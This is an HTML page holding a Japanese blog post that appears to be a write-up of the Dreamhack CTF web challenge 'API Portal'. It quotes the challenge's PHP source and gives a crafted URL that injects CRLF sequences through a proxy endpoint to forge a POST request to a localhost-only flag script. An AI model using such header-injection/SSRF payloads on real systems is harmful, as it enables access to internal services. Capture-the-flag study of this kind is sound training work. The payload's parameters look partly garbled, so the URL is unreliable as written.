<!DOCTYPE html>
<html lang="en">
  <head>
    
      <title>
        DreamhackCTF-Web-Writeups ::
        er072391 Blog
      </title>
    
    <meta http-equiv="content-type" content="text/html; charset=utf-8" />
<meta name="viewport" content="width=device-width, initial-scale=1.0" />
<meta
  name="description"
  content="API Portal # ディレクトリ構成とそれぞれのファイルの簡単な説明です
. └── html ├── action │ ├── cheat │ │ ├── eval.php eval関数があるが、実行不可 │ │ ├── phpinfo.php phpinfo(2)の結果表示 │ │ └── read-file.php /etc/passwdファイルの内容のみ表示 │ ├── db │ │ ├── create.php keyパラメータの値をmd5したディレクトリ作成 │ │ ├── delete.php keyパラメータの値をmd5したディレクトリ削除 │ │ ├── list.php /tmp/api-portal/db下のディレクトリ表示 │ │ ├── read.php dbkeyとkeyパラメータで指定したvalueを表示 │ │ └── save.php dbkeyとkeyパラメータを指定してvalueを保存 │ ├── flag │ │ ├── _flag.php 変数flagにフラグ格納 │ │ └── flag.php ローカルからのPOSTリクエスト(mode,dbkey,key)でフラグ表示 │ ├── help."
/>
<meta
  name="keywords"
  content=""
/>
<meta name="robots" content="noodp" />
<link rel="canonical" href="https://er072391.github.io/posts/dreamhackctf-web-writeups/" />





<link rel="stylesheet" href="https://er072391.github.io/assets/style.css" />

<link rel="stylesheet" href="https://er072391.github.io/style.css" />


<link
  rel="apple-touch-icon-precomposed"
  sizes="144x144"
  href="https://er072391.github.io/img/apple-touch-icon-144-precomposed.png"
/>
<link rel="shortcut icon" href="https://er072391.github.io/img/favicon.png" />


<link href="https://er072391.github.io/assets/fonts/Inter-Italic.woff2" rel="preload" type="font/woff2" as="font" crossorigin="">
<link href="https://er072391.github.io/assets/fonts/Inter-Regular.woff2" rel="preload" type="font/woff2" as="font" crossorigin="">
<link href="https://er072391.github.io/assets/fonts/Inter-Medium.woff2" rel="preload" type="font/woff2" as="font" crossorigin="">
<link href="https://er072391.github.io/assets/fonts/Inter-MediumItalic.woff2" rel="preload" type="font/woff2" as="font" crossorigin="">
<link href="https://er072391.github.io/assets/fonts/Inter-Bold.woff2" rel="preload" type="font/woff2" as="font" crossorigin="">
<link href="https://er072391.github.io/assets/fonts/Inter-BoldItalic.woff2" rel="preload" type="font/woff2" as="font" crossorigin="">


<meta name="twitter:card" content="summary"/>
<meta name="twitter:title" content="DreamhackCTF-Web-Writeups"/>
<meta name="twitter:description" content="API Portal # ディレクトリ構成とそれぞれのファイルの簡単な説明です
. └── html ├── action │ ├── cheat │ │ ├── eval.php eval関数があるが、実行不可 │ │ ├── phpinfo.php phpinfo(2)の結果表示 │ │ └── read-file.php /etc/passwdファイルの内容のみ表示 │ ├── db │ │ ├── create.php keyパラメータの値をmd5したディレクトリ作成 │ │ ├── delete.php keyパラメータの値をmd5したディレクトリ削除 │ │ ├── list.php /tmp/api-portal/db下のディレクトリ表示 │ │ ├── read.php dbkeyとkeyパラメータで指定したvalueを表示 │ │ └── save.php dbkeyとkeyパラメータを指定してvalueを保存 │ ├── flag │ │ ├── _flag.php 変数flagにフラグ格納 │ │ └── flag.php ローカルからのPOSTリクエスト(mode,dbkey,key)でフラグ表示 │ ├── help."/>



<meta property="og:title" content="DreamhackCTF-Web-Writeups" />
<meta property="og:description" content="API Portal # ディレクトリ構成とそれぞれのファイルの簡単な説明です
. └── html ├── action │ ├── cheat │ │ ├── eval.php eval関数があるが、実行不可 │ │ ├── phpinfo.php phpinfo(2)の結果表示 │ │ └── read-file.php /etc/passwdファイルの内容のみ表示 │ ├── db │ │ ├── create.php keyパラメータの値をmd5したディレクトリ作成 │ │ ├── delete.php keyパラメータの値をmd5したディレクトリ削除 │ │ ├── list.php /tmp/api-portal/db下のディレクトリ表示 │ │ ├── read.php dbkeyとkeyパラメータで指定したvalueを表示 │ │ └── save.php dbkeyとkeyパラメータを指定してvalueを保存 │ ├── flag │ │ ├── _flag.php 変数flagにフラグ格納 │ │ └── flag.php ローカルからのPOSTリクエスト(mode,dbkey,key)でフラグ表示 │ ├── help." />
<meta property="og:type" content="article" />
<meta property="og:url" content="https://er072391.github.io/posts/dreamhackctf-web-writeups/" /><meta property="article:section" content="posts" />
<meta property="article:published_time" content="2022-10-13T00:00:00+00:00" />
<meta property="article:modified_time" content="2022-10-13T00:00:00+00:00" />







  </head>
  <body class="dark-theme">
    <div class="container">
      <header class="header">
  <span class="header__inner">
    <a
  href="/index.html"
  class="logo"
  style="text-decoration: none;"
>
  
    <span class="logo__mark"><svg xmlns="http://www.w3.org/2000/svg" class="greater-icon" viewBox="0 0 44 44">
  <path fill="none" d="M15 8l14.729 14.382L15 35.367" />
</svg>
</span>
    <span class="logo__text"
      >er072391 Blog</span
    >
    <span class="logo__cursor"></span>
  
</a>

    <span class="header__right">
      
      <span class="theme-toggle">
        <svg
  class="theme-toggler"
  width="24"
  height="24"
  viewBox="0 0 48 48"
  fill="none"
  xmlns="http://www.w3.org/2000/svg"
>
  <path
    d="M22 41C32.4934 41 41 32.4934 41 22C41 11.5066 32.4934 3 22
  3C11.5066 3 3 11.5066 3 22C3 32.4934 11.5066 41 22 41ZM7 22C7
  13.7157 13.7157 7 22 7V37C13.7157 37 7 30.2843 7 22Z"
  />
</svg>

      </span>
    </span>
  </span>
</header>


      <div class="content">
        
  
  

  <div class="post">
    <h1 class="post-title">DreamhackCTF-Web-Writeups</h1>
    <div class="post-meta">
      
        <span class="post-date">
          2022-10-13
        </span>

        
          
        
      

      


      
    </div>

    

    

    <div class="post-content">
      
      <h1 id="api-portal">
  API Portal
  <a href="#api-portal" class="h-anchor" aria-hidden="true">#</a>
</h1>
<p>ディレクトリ構成とそれぞれのファイルの簡単な説明です</p>
<pre tabindex="0"><code>.
└── html
    ├── action
    │   ├── cheat
    │   │   ├── eval.php        eval関数があるが、実行不可
    │   │   ├── phpinfo.php     phpinfo(2)の結果表示
    │   │   └── read-file.php   /etc/passwdファイルの内容のみ表示
    │   ├── db
    │   │   ├── create.php      keyパラメータの値をmd5したディレクトリ作成
    │   │   ├── delete.php      keyパラメータの値をmd5したディレクトリ削除
    │   │   ├── list.php        /tmp/api-portal/db下のディレクトリ表示
    │   │   ├── read.php        dbkeyとkeyパラメータで指定したvalueを表示
    │   │   └── save.php        dbkeyとkeyパラメータを指定してvalueを保存
    │   ├── flag
    │   │   ├── _flag.php   変数flagにフラグ格納
    │   │   └── flag.php  ローカルからのPOSTリクエスト(mode,dbkey,key)でフラグ表示
    │   ├── help.php    githubページにリダイレクト
    │   ├── main.php    TODO(何もない)
    │   └── net
    │       ├── nslookup.php    OSコマンドインジェクションの欠陥があるが使えない
    │       ├── ping.php        上記と同じ
    │       └── proxy
    │           ├── get.php     urlパラメータで指定したホストにgetリクエスト
    │           └── post.php    urlパラメータで指定したホストにpostリクエスト
    └── index.php
</code></pre><p><code>html/action/flag/flag.php</code>の内容がこちら</p>
<pre tabindex="0"><code>     1	&lt;?php
     2	include &#34;_flag.php&#34;;
       
     3	if ($_SERVER[&#34;REMOTE_ADDR&#34;] === &#34;127.0.0.1&#34; || $_SERVER[&#34;REMOTE_ADDR&#34;] === &#34;::1&#34;) {
     4	    if($_POST[&#34;mode&#34;] === &#34;write&#34; &amp;&amp; isset($_POST[&#34;dbkey&#34;]) &amp;&amp; isset($_POST[&#34;key&#34;])) {
     5	        
     6	        $k1 = md5($_POST[&#34;dbkey&#34;]);
     7	        $k2 = md5($_POST[&#34;dbkey&#34;].$_POST[&#34;key&#34;]);
     8	        $value = base64_encode($flag);
       
     9	        @file_put_contents(&#34;/tmp/api-portal/db/$k1/$k2&#34;, $value);
    10	        die(&#34;success&#34;);
    11	    }
    12	}
       
    13	$x = $flag;
    14	for($i = 0; $i &lt; 1337; $i++)
    15	    $x = sha1($x);
       
    16	header(&#34;Content-Type: text/plain&#34;);
       
       
    17	die(&lt;&lt;&lt;EOF
    18	--API Portal Doc--
    19	Endpoint: flag/flag
    20	Method: POST
    21	Parameter: [POST] mode &#34;write&#34; (mandatory)
    22	Parameter: [POST] dbkey
    23	Parameter: [POST] key
       
    24	Update (dbkey-&gt;key)&#39;s value of the Key-Value storage with flag
       
       
    25	Fun fact: (sha1 * sha1 * ... sha1)(flag) == $x (1337 times)
    26	EOF);
</code></pre><p>3、４行目でローカルからのアクセス、そしてPOSTリクエストの条件が合致したら、<br>
フラグをKVS(Key-Value Store)で保存している。
<!-- raw HTML omitted -->
<code>html/action/net/proxy/post.php</code>の内容がこちら</p>
<pre tabindex="0"><code>     1	$ip = $param[1];
     2	$referer = $param[2];
       
     3	$header = &#34;User-Agent: API Portal Proxy\r\n&#34;;
     4	$header .= &#34;X-Forwarded-For: {$ip}\r\n&#34;;
     5	$header .= &#34;X-Api-Referer: {$referer}&#34;;
       
     6	$ctx = stream_context_create(array(
     7	    &#39;http&#39; =&gt; array(
     8	        &#39;method&#39; =&gt; &#39;POST&#39;,
     9	        &#34;content&#34; =&gt; &#34;&#34;, //TODO: implement
    10	        &#39;header&#39; =&gt; $header
    11	    )
    12	));
       
    13	die(file_get_contents($url, null, $ctx));
</code></pre><p>パラメータを<code>X-Forwarded-For</code>と<code>X-Api-Referer</code>にセットしている。<br>
そして、9行目が<code>TODO</code>となっておりデータの格納ができない。<br>
なんとかして<code>html/action/flag/flag.php</code>にPOSTリクエストを送信したい。<br>
<code>html/action/net/proxy/post.php</code>の４、５行目は送られたパラメータの値をそのままヘッダーに格納している。<code>CRLF攻撃</code>が有効。以下のリクエストを送信する。</p>
<pre tabindex="0"><code>http://host3.dreamhack.games:12345/index.php?action=net/proxy/post&amp;url=127.0.0.1/action/flag/flag.php&amp;%5Cr%5CnContent-Type: application/x-www-form-urlencoded%5Cr%5CnContent-Length: 32%5Cr%5Cn%5Cr%5Cnmode=write&amp;hoge&amp;key=hoge%5Cr%5Cn
</code></pre><p>フラグを登録させる前に、<code>create.php</code>でディレクトリを作成しておく必要がある。</p>

    </div>
    
      
        <div class="pagination">
          <div class="pagination__title">
            <span class="pagination__title-h"
              >Read other posts</span
            >
            <hr />
          </div>
          <div class="pagination__buttons">
            
              <span class="button previous">
                <a href="https://er072391.github.io/posts/ctf-support/">
                  <span class="button__icon">←</span>
                  <span class="button__text">CTF Support</span>
                </a>
              </span>
            
            
              <span class="button next">
                <a href="https://er072391.github.io/posts/elf%E3%81%AE%E4%BF%9D%E8%AD%B7%E6%A9%9F%E8%83%BD%E3%81%AB%E3%81%A4%E3%81%84%E3%81%A6/">
                  <span class="button__text">ELFの保護機能について</span>
                  <span class="button__icon">→</span>
                </a>
              </span>
            
          </div>
        </div>
      
    

    
      
        

      
    
  </div>

      </div>

      
        <footer class="footer">
  <div class="footer__inner">
    
      <a
  href="/index.html"
  class="logo"
  style="text-decoration: none;"
>
  
    <span class="logo__mark"><svg xmlns="http://www.w3.org/2000/svg" class="greater-icon" viewBox="0 0 44 44">
  <path fill="none" d="M15 8l14.729 14.382L15 35.367" />
</svg>
</span>
    <span class="logo__text"
      >er072391 Blog</span
    >
    <span class="logo__cursor"></span>
  
</a>

      <div class="copyright">
        <span
          >© 2022 Powered by
          <a href="https://gohugo.io" target="_blank" rel="noopener">Hugo</a></span
        >
        <span
          >Theme created by
          <a href="https://twitter.com/panr" target="_blank" rel="noopener">panr</a></span
        >
      </div>
    
  </div>
</footer>

<script src="https://er072391.github.io/assets/main.js"></script>
<script src="https://er072391.github.io/assets/prism.js"></script>


      
    </div>

    
  </body>
</html>
